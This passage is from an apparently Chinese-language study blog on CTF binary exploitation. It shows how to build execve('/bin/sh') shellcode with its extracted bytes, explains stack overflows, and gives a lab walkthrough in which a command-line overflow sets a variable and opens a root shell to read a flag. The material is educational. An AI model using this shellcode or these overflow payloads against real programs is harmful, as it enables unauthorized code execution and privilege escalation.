 0x00000000004005cd <+55>:    mov    rdi,rax\n   0x00000000004005d0 <+58>:    call   0x400480 <execve@plt>\n   0x00000000004005d5 <+63>:    mov    eax,0x0\n   0x00000000004005da <+68>:    mov    rdx,QWORD PTR [rbp-0x8]\n   0x00000000004005de <+72>:    xor    rdx,QWORD PTR fs:0x28\n   0x00000000004005e7 <+81>:    je     0x4005ee <main+88>\n   0x00000000004005e9 <+83>:    call   0x400460 <__stack_chk_fail@plt>\n   0x00000000004005ee <+88>:    leave\n   0x00000000004005ef <+89>:    ret\nEnd of assembler dump.\npwndbg>\n```\n\n其中关键点在 \n\n```assembly\n0x00000000004005c5 <+47>:   mov    edx,0x0\n0x00000000004005ca <+52>:   mov    rsi,rcx\n0x00000000004005cd <+55>:   mov    rdi,rax\n0x00000000004005d0 <+58>:   call   0x400480 <execve@plt>\n```\n\n传递了三个参数并且call execve()。 直接使用这四条指令显然是不行的，shellcode需要能够独立运行并且尽量短小，这里的call 0x400480 <execve@plt>依赖plt表，前面的参数传递也依赖程序的数据段等，我们需要用汇编来重写这里的代码。 对于call 0x400480 <execve@plt>，我们可以用系统调用来重写，execve的调用号为：0xb，那么就有 \n\n```assembly\nmov al,0xb\nint 0x80\n```\n\n这里的0x80是根据al的值进行系统调用。 为了传参方便，这里采用32位汇编的写法，把参数push到栈上就可以传递参数了。 先将\"/bin/sh\"压栈\n\n```assembly\nxor eax,eax\npush eax\npush 0x68732f2f\npush 0x6e69622f\n```\n\n注意这里用xor eax,eax把eax置0，不使用mov eax,0的原因是这样会出现\\x00，shellcode会被gets()这类函数截断。 esp指向当前栈顶，此时即指向\"/bin/sh\",我们把esp保存到ebx \n\n```assembly\nmov ebx,esp\n```\n\n现在把两个参数压栈，eax为NULL(0)，ebx为\"/bin/sh\"的地址\n\n```assembly\npush eax\npush ebx\n```\n\n此时esp指向数组argv，把它赋值给ecx。\n\n```assembly\nmov ecx,esp\nxor edx,edx\nmov al,0xb\nint 0x80       ;通过中断0x80进行系统调用\n```\n\n所以有完整的代码： \n\n```assembly\nsection .text\nglobal _start\n_start:\nxor eax,eax\npush eax\npush 0x68732f2f\npush 0x6e69622f\nmov ebx,esp\npush eax\npush ebx\nmov ecx,esp\nxor edx,edx\nmov al,0xb\nint 0x80\n```\n\n保存为shell.asm，使用nasm编译，链接，运行（nasm可以使用 sudo apt-get install nasm 进行安装）\n\n```shell\n$ nasm -f elf32 shell.asm -o shell.o\n$ ld -m elf_i386 -o shell shell.o\n$ ./shell\n$ echo u got it\nu got it\n```\n\n成功了，使用objdump提取\n\n```assembly\n$ objdump -d shell\nshell:     file format elf32-i386\nDisassembly of section .text:\n08048060 <_start>:\n 8048060:   31 c0                   xor    %eax,%eax\n 8048062:   50                      push   %eax\n 8048063:   68 2f 2f 73 68          push   $0x68732f2f\n 8048068:   68 2f 62 69 6e          push   $0x6e69622f\n 804806d:   89 e3                   mov    %esp,%ebx\n 804806f:   50                      push   %eax\n 8048070:   53                      push   %ebx\n 8048071:   89 e1                   mov    %esp,%ecx\n 8048073:   31 d2                   xor    %edx,%edx\n 8048075:   b0 0b                   mov    $0xb,%al\n 8048077:   cd 80                   int    $0x80\n```\n\n这样就提取到了,下面可以写个c程序验证一下。\n\n```shell\n#include <stdio.h>\nchar shellcode[]=\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\xcd\\x80\";\nint main()\n{\n    void (*fp) (void);\n    fp=(void *)shellcode;\n    fp();\n}\n\n$ gcc auth.c -fno-stack-protector -o auth -z execstack -m32\n$ ./auth\n$ echo u got it\nu got it\n```\n\n**栈溢出之篡改邻近变量**\n\n1. 通过-fno-stack-protector和-m32参数从gcc编译stack0.c文件。\n2. 运行编译后的程序，通过缓冲区溢出修改与字符串数组相邻的变量，得到输出\"you     have changed the 'modified' variable\"\n3. 运行stack1程序，通过栈溢出得到输出\"you     have correctly got the variable to the right value\"\n\n缓冲区溢出（buffer overflow），是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容（通常是超过缓冲区能保存的最大数据量的数据），从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权。\n\n**栈溢出之ShellCode简例**\n\n```c\nchar *pwnthis()\n{\n  char s; // [sp+0h] [bp-48h]@1\nreturn gets(&s);\n}\nint win()\n{\n  return puts(\"code flow successfully changed\");\n}\n```\n\n```assembly\n.text:08048454 ; ==== S U B R O U T I N E ==========================================================================\n.text:08048454\n.text:08048454 ; Attributes: bp-based frame\n.text:08048454\n.text:08048454                 public pwnthis\n.text:08048454 pwnthis         proc near               ; CODE XREF: main+11\u0019p\n.text:08048454\n.text:08048454 s               = byte ptr -48h\n.text:08048454\n.text:08048454                 push    ebp\n.text:08048455                 mov     ebp, esp\n.text:08048457                 sub     esp, 48h\n.text:0804845A                 sub     esp, 0Ch\n.text:0804845D                 lea     eax, [ebp+s]\n.text:08048460                 push    eax             ; s\n.text:08048461                 call    _gets\n.text:08048466                 add     esp, 10h\n.text:08048469                 nop\n.text:0804846A                 leave\n.text:0804846B                 retn\n.text:0804846B pwnthis         endp\n\n```\n\npwnthis()函数中有且仅有一个危险函数gets(&s);,目标仍然是跳转到函数win()上获得输出code flow successfully changed。\n\n在IDA pro中双击 char s查看栈的结构\n\n```assembly\n-00000048 s               db ?\n-00000047                 db ? ; undefined\n-00000046                 db ? ; undefined\n-00000045                 db ? ; undefined\n-00000044                 db ? ; undefined\n-00000043                 db ? ; undefined\n-00000042                 db ? ; undefined\n-00000041                 db ? ; undefined\n-00000040                 db ? ; undefined\n-0000003F                 db ? ; undefined\n-0000003E                 db ? ; undefined\n-0000003D                 db ? ; undefined\n-0000003C                 db ? ; undefined\n-0000003B                 db ? ; undefined\n-0000003A                 db ? ; undefined\n-00000039                 db ? ; undefined\n-00000038                 db ? ; undefined\n-00000037                 db ? ; undefined\n-00000036                 db ? ; undefined\n-00000035                 db ? ; undefined\n-00000034                 db ? ; undefined\n-00000033                 db ? ; undefined\n-00000032                 db ? ; undefined\n-00000031                 db ? ; undefined\n-00000030                 db ? ; undefined\n-0000002F                 db ? ; undefined\n-0000002E                 db ? ; undefined\n-0000002D                 db ? ; undefined\n-0000002C                 db ? ; undefined\n-0000002B                 db ? ; undefined\n-0000002A                 db ? ; undefined\n-00000029                 db ? ; undefined\n-00000028                 db ? ; undefined\n-00000027                 db ? ; undefined\n-00000026                 db ? ; undefined\n-00000025                 db ? ; undefined\n-00000024                 db ? ; undefined\n-00000023                 db ? ; undefined\n-00000022                 db ? ; undefined\n-00000021                 db ? ; undefined\n-00000020                 db ? ; undefined\n-0000001F                 db ? ; undefined\n-0000001E                 db ? ; undefined\n-0000001D                 db ? ; undefined\n-0000001C                 db ? ; undefined\n-0000001B                 db ? ; undefined\n-0000001A                 db ? ; undefined\n-00000019                 db ? ; undefined\n-00000018                 db ? ; undefined\n-00000017                 db ? ; undefined\n-00000016                 db ? ; undefined\n-00000015                 db ? ; undefined\n-00000014                 db ? ; undefined\n-00000013                 db ? ; undefined\n-00000012                 db ? ; undefined\n-00000011                 db ? ; undefined\n-00000010                 db ? ; undefined\n-0000000F                 db ? ; undefined\n-0000000E                 db ? ; undefined\n-0000000D                 db ? ; undefined\n-0000000C                 db ? ; undefined\n-0000000B                 db ? ; undefined\n-0000000A                 db ? ; undefined\n-00000009                 db ? ; undefined\n-00000008                 db ? ; undefined\n-00000007                 db ? ; undefined\n-00000006                 db ? ; undefined\n-00000005                 db ? ; undefined\n-00000004                 db ? ; undefined\n-00000003                 db ? ; undefined\n-00000002                 db ? ; undefined\n-00000001                 db ? ; undefined\n+00000000  s              db 4 dup(?)\n+00000004  r              db 4 dup(?)\n```\n\n其中 48处的s是指字符数组s，00处的s指保存在栈上的寄存器，r指的是返回地址，我们的目标就是覆盖返回地址，使函数在执行ret指令时，将我们覆盖的返回地址的值pop弹出到eip，从而改变程序的执行流。\n\n堆栈是一块保存数据的连续内存。 一个名为堆栈指针(SP)的寄存器指向堆栈的顶部。 堆栈的底部在一个固定的地址。 堆栈的大小在运行时由内核动态地调整。 CPU实现指令 PUSH和POP， 向堆栈中添加元素和从中移去元素。 堆栈由逻辑堆栈帧组成。 当调用函数时逻辑堆栈帧被压入栈中， 当函数返回时逻辑 堆栈帧被从栈中弹出。 堆栈帧包括函数的参数， 函数的局部变量， 以及恢复前一个堆栈 帧所需要的数据， 其中包括在函数调用时指令指针(IP)的值。 堆栈既可以向下增长(向内存低地址)也可以向上增长， 这依赖于具体的实现。 在我 们的例子中， 堆栈是向下增长的。 这是很多计算机的实现方式， 包括Intel， Motorola， SPARC和MIPS处理器。 堆栈指针(SP)也是依赖于具体实现的。 它可以指向堆栈的最后地址， 或者指向堆栈之后的下一个空闲可用地址。 在我们的讨论当中， SP指向堆栈的最后地址。 除了堆栈指针(SP指向堆栈顶部的的低地址)之外， 为了使用方便还有指向帧内固定 地址的指针叫做帧指针(FP)。 有些文章把它叫做局部基指针(LB-local base pointer)。 从理论上来说， 局部变量可以用SP加偏移量来引用。 然而， 当有字被压栈和出栈后， 这 些偏移量就变了。 尽管在某些情况下编译器能够跟踪栈中的字操作， 由此可以修正偏移 量， 但是在某些情况下不能。 而且在所有情况下， 要引入可观的管理开销。 而且在有些 机器上， 比如Intel处理器， 由SP加偏移量访问一个变量需要多条指令才能实现。 因此， 许多编译器使用第二个寄存器， FP， 对于局部变量和函数参数都可以引用， 因为它们到FP的距离不会受到PUSH和POP操作的影响。 在Intel CPU中， BP(EBP)用于这 个目的。 在Motorola CPU中， 除了A7(堆栈指针SP)之外的任何地址寄存器都可以做FP。 考虑到我们堆栈的增长方向， 从FP的位置开始计算， 函数参数的偏移量是正值， 而局部 变量的偏移量是负值。 当一个例程被调用时所必须做的第一件事是保存前一个FP(这样当例程退出时就可以 恢复)。 然后它把SP复制到FP， 创建新的FP， 把SP向前移动为局部变量保留空间。 这称为 例程的序幕(prolog)工作。 当例程退出时， 堆栈必须被清除干净， 这称为例程的收尾 (epilog)工作。 Intel的ENTER和LEAVE指令， Motorola的LINK和UNLINK指令， 都可以用于 有效地序幕和收尾工作。\n\n**步骤1：** 程序源代码\n\n```c\nvoid vuln(int tmp, char *str) {\n    int win = tmp;\n    char buf[64];\n    strcpy(buf, str);\n    dump_stack((void **) buf, 23, (void **) &tmp);\n    printf(\"win = %d\\n\", win);\n    if (win == 1) {\n        execl(\"/bin/sh\", \"sh\", NULL);\n    } else {\n        printf(\"Sorry, you lose.\\n\");\n    }\n    exit(0);\n}\nint main(int argc, char **argv) {\n    if (argc != 2) {\n        printf(\"Usage: stack_overwrite [str]\\n\");\n        return 1;\n    }\nuid_t euid = geteuid();\n    setresuid(euid, euid, euid);\n    vuln(0, argv[1]);\n    return 0;\n}\n```\n\n**步骤2：** 首先，我们打开平台，点击操作机，点击通过web ssh登录进入控制台。\n\n**步骤3：** 我们输入ls，查看当前文件夹下有三个文件，我们尝试cat flag，发现权限缺失，所以我们尝试利用overflow1-3948d17028101c40的漏洞进行攻击。\n\n**步骤4：** 首先，我们的输入是程序的命令行参数。第二，如果我们可以设置win变量等于1，我们会得到一个shell！ 让我们进行cat flag。\n\n```assembly\n$ ./overflow1-3948d17028101c40 $(python -c 'print \"A\"*64 + \"B\"')\nStack dump:\n0xffa81994: 0xffa82845 (second argument)\n0xffa81990: 0x00000000 (first argument)\n0xffa8198c: 0x0804870f (saved eip)\n0xffa81988: 0xffa819b8 (saved ebp)\n0xffa81984: 0xf779c000\n0xffa81980: 0xf76a8a00\n0xffa8197c: 0x00000042\n0xffa81978: 0x41414141\n0xffa81974: 0x41414141\n0xffa81970: 0x41414141\n0xffa8196c: 0x41414141\n0xffa81968: 0x41414141\n0xffa81964: 0x41414141\n0xffa81960: 0x41414141\n0xffa8195c: 0x41414141\n0xffa81958: 0x41414141\n0xffa81954: 0x41414141\n0xffa81950: 0x41414141\n0xffa8194c: 0x41414141\n0xffa81948: 0x41414141\n0xffa81944: 0x41414141\n0xffa81940: 0x41414141\n0xffa8193c: 0x41414141 (beginning of buffer)\nwin = 66\nSorry, you lose.\n```\n\n**步骤5：** 你会看到，如果我们填满了缓冲区（“A”* 64）和一个\"B\"字母，win的值会改变。 对于那些不知道的人，“B”的ascii值是66，这意味着我们可以控制win变量。 我们所要做的就是提交一个ascii值为1的字符。由于这是不可打印的，我们将在python中使用转义序列。\n\n```assembly\n$ ./overflow1-3948d17028101c40 $(python -c 'print \"A\"*64 + \"\\x01\"')\nStack dump:\n0xff828874: 0xff829848 (second argument)\n0xff828870: 0x00000000 (first argument)\n0xff82886c: 0x0804870f (saved eip)\n0xff828868: 0xff828898 (saved ebp)\n0xff828864: 0xf77b7000\n0xff828860: 0xf76c3aa7\n0xff82885c: 0x00000001\n0xff828858: 0x41414141\n0xff828854: 0x41414141\n0xff828850: 0x41414141\n0xff82884c: 0x41414141\n0xff828848: 0x41414141\n0xff828844: 0x41414141\n0xff828840: 0x41414141\n0xff82883c: 0x41414141\n0xff828838: 0x41414141\n0xff828834: 0x41414141\n0xff828830: 0x41414141\n0xff82882c: 0x41414141\n0xff828828: 0x41414141\n0xff828824: 0x41414141\n0xff828820: 0x41414141\n0xff82881c: 0x41414141 (beginning of buffer)\nwin = 1\n$\n```\n\n**步骤6：** 之后，我们输入id，发现我们已经拿到了root的权限。然后我们再cat flag，这次便成功获取到flag了。\n\n","slug":"ctfpwn5","published":1,"date":"2021-06-30T09:42:36.438Z","updated":"2021-06-30T14:03:15.411Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cksan4n9s0007rouvgxr7d2y2","content":"<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">学习日记5</span><br></pre></td></tr></table></figure>\n\n<p><strong>shellcode</strong></p>\n<p>是一段机器指令，用于在溢出之后改变系统的正常流程，转而执行shellcode从而入侵目标系统。</p>\n<p>shellcode基本的编写方式：</p>\n<ul>\n<li>编写c程序实现功能</li>\n<li>使用汇编来替代函数调用等</li>\n<li>汇编编译链接，获取机器码</li>\n</ul>\n<p>这里使用c语言来进行编写。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> *name[<span class=\"number\">2</span>];</span><br><span class=\"line\">    name[<span class=\"number\">0</span>]=<span class=\"string\">&quot;/bin/sh&quot;</span>;</span><br><span class=\"line\">    name[<span class=\"number\">1</span>]=<span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    execve(name[<span class=\"number\">0</span>],name,<span class=\"literal\">NULL</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>其中execve进行系统调用，通过name[0]提供的参数”/bin/sh”起一个shell。 execve（参数1，参数2，参数3） 参数1：命令所在路径 参数2：命令的集合 参数3：传递给执行文件的环境变量集尝试编译运行。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> gcc shell.c -o shell</span></span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> ./shell</span></span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> <span class=\"built_in\">echo</span> u got it</span></span><br><span class=\"line\">u got it</span><br></pre></td></tr></table></figure>\n\n<p>用gdb查看</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ gdb shell -q</span><br><span class=\"line\">pwndbg: loaded 164 commands. Type pwndbg [filter] for a list.</span><br><span class=\"line\">pwndbg: created $rebase, $ida gdb functions (can be used with print/break)</span><br><span class=\"line\">Reading symbols from shell...(no debugging symbols found)...done.</span><br><span class=\"line\">pwndbg&gt; disass main</span><br><span class=\"line\">Dump of assembler code for function main:</span><br><span class=\"line\">   0x0000000000400596 &lt;+0&gt;: push   rbp</span><br><span class=\"line\">   0x0000000000400597 &lt;+1&gt;: mov    rbp,rsp</span><br><span class=\"line\">   0x000000000040059a &lt;+4&gt;: sub    rsp,0x20</span><br><span class=\"line\">   0x000000000040059e &lt;+8&gt;: mov    rax,QWORD PTR fs:0x28</span><br><span class=\"line\">   0x00000000004005a7 &lt;+17&gt;:    mov    QWORD PTR [rbp-0x8],rax</span><br><span class=\"line\">   0x00000000004005ab &lt;+21&gt;:    xor    eax,eax</span><br><span class=\"line\">   0x00000000004005ad &lt;+23&gt;:    mov    QWORD PTR [rbp-0x20],0x400674</span><br><span class=\"line\">   0x00000000004005b5 &lt;+31&gt;:    mov    QWORD PTR [rbp-0x18],0x0</span><br><span class=\"line\">   0x00000000004005bd &lt;+39&gt;:    mov    rax,QWORD PTR [rbp-0x20]</span><br><span class=\"line\">   0x00000000004005c1 &lt;+43&gt;:    lea    rcx,[rbp-0x20]</span><br><span class=\"line\">   0x00000000004005c5 &lt;+47&gt;:    mov    edx,0x0</span><br><span class=\"line\">   0x00000000004005ca &lt;+52&gt;:    mov    rsi,rcx</span><br><span class=\"line\">   0x00000000004005cd &lt;+55&gt;:    mov    rdi,rax</span><br><span class=\"line\">   0x00000000004005d0 &lt;+58&gt;:    call   0x400480 &lt;execve@plt&gt;</span><br><span class=\"line\">   0x00000000004005d5 &lt;+63&gt;:    mov    eax,0x0</span><br><span class=\"line\">   0x00000000004005da &lt;+68&gt;:    mov    rdx,QWORD PTR [rbp-0x8]</span><br><span class=\"line\">   0x00000000004005de &lt;+72&gt;:    xor    rdx,QWORD PTR fs:0x28</span><br><span class=\"line\">   0x00000000004005e7 &lt;+81&gt;:    je     0x4005ee &lt;main+88&gt;</span><br><span class=\"line\">   0x00000000004005e9 &lt;+83&gt;:    call   0x400460 &lt;__stack_chk_fail@plt&gt;</span><br><span class=\"line\">   0x00000000004005ee &lt;+88&gt;:    leave</span><br><span class=\"line\">   0x00000000004005ef &lt;+89&gt;:    ret</span><br><span class=\"line\">End of assembler dump.</span><br><span class=\"line\">pwndbg&gt;</span><br></pre></td></tr></table></figure>\n\n<p>其中关键点在 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x00000000004005c5 &lt;+47&gt;:   mov    edx,0x0</span><br><span class=\"line\">0x00000000004005ca &lt;+52&gt;:   mov    rsi,rcx</span><br><span class=\"line\">0x00000000004005cd &lt;+55&gt;:   mov    rdi,rax</span><br><span class=\"line\">0x00000000004005d0 &lt;+58&gt;:   call   0x400480 &lt;execve@plt&gt;</span><br></pre></td></tr></table></figure>\n\n<p>传递了三个参数并且call execve()。 直接使用这四条指令显然是不行的，shellcode需要能够独立运行并且尽量短小，这里的call 0x400480 &lt;execve@plt&gt;依赖plt表，前面的参数传递也依赖程序的数据段等，我们需要用汇编来重写这里的代码。 对于call 0x400480 &lt;execve@plt&gt;，我们可以用系统调用来重写，execve的调用号为：0xb，那么就有 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov al,0xb</span><br><span class=\"line\">int 0x80</span><br></pre></td></tr></table></figure>\n\n<p>这里的0x80是根据al的值进行系统调用。 为了传参方便，这里采用32位汇编的写法，把参数push到栈上就可以传递参数了。 先将”/bin/sh”压栈</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">xor eax,eax</span><br><span class=\"line\">push eax</span><br><span class=\"line\">push 0x68732f2f</span><br><span class=\"line\">push 0x6e69622f</span><br></pre></td></tr></table></figure>\n\n<p>注意这里用xor eax,eax把eax置0，不使用mov eax,0的原因是这样会出现\\x00，shellcode会被gets()这类函数截断。 esp指向当前栈顶，此时即指向”/bin/sh”,我们把esp保存到ebx </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov ebx,esp</span><br></pre></td></tr></table></figure>\n\n<p>现在把两个参数压栈，eax为NULL(0)，ebx为”/bin/sh”的地址</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">push eax</span><br><span class=\"line\">push ebx</span><br></pre></td></tr></table></figure>\n\n<p>此时esp指向数组argv，把它赋值给ecx。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov ecx,esp</span><br><span class=\"line\">xor edx,edx</span><br><span class=\"line\">mov al,0xb</span><br><span class=\"line\">int 0x80       ;通过中断0x80进行系统调用</span><br></pre></td></tr></table></figure>\n\n<p>所以有完整的代码： </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">section .text</span><br><span class=\"line\">global _start</span><br><span class=\"line\">_start:</span><br><span class=\"line\">xor eax,eax</span><br><span class=\"line\">push eax</span><br><span class=\"line\">push 0x68732f2f</span><br><span class=\"line\">push 0x6e69622f</span><br><span class=\"line\">mov ebx,esp</span><br><span class=\"line\">push eax</span><br><span class=\"line\">push ebx</span><br><span class=\"line\">mov ecx,esp</span><br><span class=\"line\">xor edx,edx</span><br><span class=\"line\">mov al,0xb</span><br><span class=\"line\">int 0x80</span><br></pre></td></tr></table></figure>\n\n<p>保存为shell.asm，使用nasm编译，链接，运行（nasm可以使用 sudo apt-get install nasm 进行安装）</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> nasm -f elf32 shell.asm -o shell.o</span></span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> ld -m elf_i386 -o shell shell.o</span></span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> ./shell</span></span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> <span class=\"built_in\">echo</span> u got it</span></span><br><span class=\"line\">u got it</span><br></pre></td></tr></table></figure>\n\n<p>成功了，使用objdump提取</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ objdump -d shell</span><br><span class=\"line\">shell:     file format elf32-i386</span><br><span class=\"line\">Disassembly of section .text:</span><br><span class=\"line\">08048060 &lt;_start&gt;:</span><br><span class=\"line\"> 8048060:   31 c0                   xor    %eax,%eax</span><br><span class=\"line\"> 8048062:   50                      push   %eax</span><br><span class=\"line\"> 8048063:   68 2f 2f 73 68          push   $0x68732f2f</span><br><span class=\"line\"> 8048068:   68 2f 62 69 6e          push   $0x6e69622f</span><br><span class=\"line\"> 804806d:   89 e3                   mov    %esp,%ebx</span><br><span class=\"line\"> 804806f:   50                      push   %eax</span><br><span class=\"line\"> 8048070:   53                      push   %ebx</span><br><span class=\"line\"> 8048071:   89 e1                   mov    %esp,%ecx</span><br><span class=\"line\"> 8048073:   31 d2                   xor    %edx,%edx</span><br><span class=\"line\"> 8048075:   b0 0b                   mov    $0xb,%al</span><br><span class=\"line\"> 8048077:   cd 80                   int    $0x80</span><br></pre></td></tr></table></figure>\n\n<p>这样就提取到了,下面可以写个c程序验证一下。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">include &lt;stdio.h&gt;</span></span><br><span class=\"line\">char shellcode[]=&quot;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\xcd\\x80&quot;;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    void (*fp) (void);</span><br><span class=\"line\">    fp=(void *)shellcode;</span><br><span class=\"line\">    fp();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> gcc auth.c -fno-stack-protector -o auth -z execstack -m32</span></span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> ./auth</span></span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> <span class=\"built_in\">echo</span> u got it</span></span><br><span class=\"line\">u got it</span><br></pre></td></tr></table></figure>\n\n<p><strong>栈溢出之篡改邻近变量</strong></p>\n<ol>\n<li>通过-fno-stack-protector和-m32参数从gcc编译stack0.c文件。</li>\n<li>运行编译后的程序，通过缓冲区溢出修改与字符串数组相邻的变量，得到输出”you     have changed the ‘modified’ variable”</li>\n<li>运行stack1程序，通过栈溢出得到输出”you     have correctly got the variable to the right value”</li>\n</ol>\n<p>缓冲区溢出（buffer overflow），是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容（通常是超过缓冲区能保存的最大数据量的数据），从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权。</p>\n<p><strong>栈溢出之ShellCode简例</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">char</span> *<span class=\"title\">pwnthis</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">char</span> s; <span class=\"comment\">// [sp+0h] [bp-48h]@1</span></span><br><span class=\"line\"><span class=\"keyword\">return</span> gets(&amp;s);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">win</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;code flow successfully changed&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span 